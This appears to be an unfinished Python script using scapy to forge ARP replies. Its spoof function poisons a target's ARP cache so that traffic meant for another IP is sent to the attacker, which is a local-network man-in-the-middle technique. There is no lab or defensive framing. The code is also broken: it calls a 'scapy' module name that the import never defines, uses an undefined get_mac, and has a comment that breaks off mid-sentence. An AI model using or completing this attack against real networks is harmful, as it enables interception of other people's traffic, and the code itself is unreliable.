from scapy.all import *
from scapy.layers.l2 import Ether 

import sys
from time import sleep


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, 
                     hwdst = get_mac(target_ip), 
                               psrc = spoof_ip)
  
    scapy.send(packet, verbose = False)

    
# I should add to the packet that my
print( getmacbyip("10.1.0.133") )
